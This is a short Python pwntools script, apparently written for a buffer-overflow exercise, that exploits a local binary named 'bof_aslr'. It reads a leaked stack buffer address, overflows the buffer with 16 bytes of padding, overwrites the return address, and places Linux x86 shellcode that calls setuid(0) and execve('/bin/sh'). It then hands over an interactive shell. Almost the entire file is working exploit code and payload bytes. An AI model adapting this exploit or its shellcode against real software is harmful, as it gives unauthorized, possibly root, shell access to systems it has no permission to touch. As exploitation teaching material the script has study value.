from pwn import *
import re

p = process("./bof_aslr")

# shellcode to spawn a shell from
# http://www.vividmachines.com/shellcode/shellcode.html#linex3
EGG =  "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"
EGG += "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"
EGG += "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"
EGG += "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"
EGG += "\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42"

a = p.recvline()
addr = re.findall("(0x[0-9a-f]*)", a)[0] # Grab the address of buf
print "Found string address %s" % addr

addr = int(addr, 16)  # Convert to a hex value for p32

# Jump to the address just after the return address, which has
# our shell code
p.sendline('A'*16 + p32(addr + 20) + EGG)

p.interactive()